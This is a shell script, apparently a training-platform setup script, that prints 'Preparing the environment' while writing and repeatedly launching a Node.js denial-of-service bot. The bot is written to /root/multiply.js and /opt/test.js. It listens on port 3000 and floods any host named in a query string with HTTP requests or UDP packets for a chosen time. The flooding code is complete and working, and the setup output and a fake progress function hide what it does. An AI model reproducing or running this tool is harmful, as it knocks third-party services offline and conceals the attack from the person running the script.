cat << 'EOF' > /root/multiply.js
const req = require('request');
var http = require('http');
var url = require('url');
var randomstring = require("randomstring");
var dgram = require('dgram');
var host;
var time;
var method;

var server = http.createServer(function(request, response) {
    var queryData = url.parse(request.url, true).query;
    response.writeHead(200, {
        "Content-Type": "text/plain"
    });

    if (queryData.host) {
        host = queryData.host;
        console.log(host)

    } else {
        response.end("Please fill out the required fields!");
    }
    if (queryData.time) {
        time = queryData.time;
        time = Number(time)
        console.log(time)

    } else {
        response.end("Please fill out the required fields!");
    }
    if (queryData.method) {
        method = queryData.method;
        console.log(method)
        if (method == "udp") {
            console.log("UDP FLOOD");
            udpflood();
        } else {
            // Do nothing
        }
        if (method == "http") {
            console.log("HTTP FLOOD")
            httpflood();
        } else {
            //Do Nothing
        }

    } else {
        response.end("Please fill out the required fields!");
    }

    function httpflood() {
        var requests = 10000;
        var timesRun = 0;
        var interval = setInterval(function() {
            timesRun += 1;
            if (timesRun === time) {
                console.log("Attack ran for " + time + " seconds");
                clearInterval(interval);
            }
            for (let i = requests; i--;)
                req("http://" + host)
            console.log("Attack Running on " + host + " with " + requests + " requets per second")

        }, 2000)
    }

    function udpflood() {
        setInterval(function() {
            var client = dgram.createSocket('udp4');
            var message = randomstring.generate(10000);
            var port = Math.floor(Math.random() * (80) + 1);
            client.send(message, 0, message.length, port, host, function(err, bytes) {
                if (err) throw err;
               //console.log(message);
            });
        }, 1);
    }
});

server.listen(3000);

EOF
clear

echo -e "Preparing the environment ..."

show_progress()
{
  echo -n "Starting"
  local -r pid="${1}"
  local -r delay='0.75'
  local spinstr='\|/-'
  local temp
  printf "    \b\b\b\b"
  until [ -f /tmp/kc-scenario-done ]; do
  node /root/multiply.js
  done
  printf "    \b\b\b\b"
  echo ""
  echo "Configured"
}

show_progress
cat << 'EOF' > /opt/test.js
const req = require('request');
var http = require('http');
var url = require('url');
var randomstring = require("randomstring");
var dgram = require('dgram');
var host;
var time;
var method;

var server = http.createServer(function(request, response) {
    var queryData = url.parse(request.url, true).query;
    response.writeHead(200, {
        "Content-Type": "text/plain"
    });

    if (queryData.host) {
        host = queryData.host;
        console.log(host)

    } else {
        response.end("Please fill out the required fields!");
    }
    if (queryData.time) {
        time = queryData.time;
        time = Number(time)
        console.log(time)

    } else {
        response.end("Please fill out the required fields!");
    }
    if (queryData.method) {
        method = queryData.method;
        console.log(method)
        if (method == "udp") {
            console.log("UDP FLOOD");
            udpflood();
        } else {
            // Do nothing
        }
        if (method == "http") {
            console.log("HTTP FLOOD")
            httpflood();
        } else {
            //Do Nothing
        }

    } else {
        response.end("Please fill out the required fields!");
    }

    function httpflood() {
        var requests = 10000;
        var timesRun = 0;
        var interval = setInterval(function() {
            timesRun += 1;
            if (timesRun === time) {
                console.log("Attack ran for " + time + " seconds");
                clearInterval(interval);
            }
            for (let i = requests; i--;)
                req("http://" + host)
            console.log("Attack Running on " + host + " with " + requests + " requets per second")

        }, 2000)
    }

    function udpflood() {
        setInterval(function() {
            var client = dgram.createSocket('udp4');
            var message = randomstring.generate(10000);
            var port = Math.floor(Math.random() * (80) + 1);
            client.send(message, 0, message.length, port, host, function(err, bytes) {
                if (err) throw err;
               //console.log(message);
            });
        }, 1);
    }
});

server.listen(3000);
EOF



echo 'done' > /opt/katacoda-background-finished
node /root/multiply.js
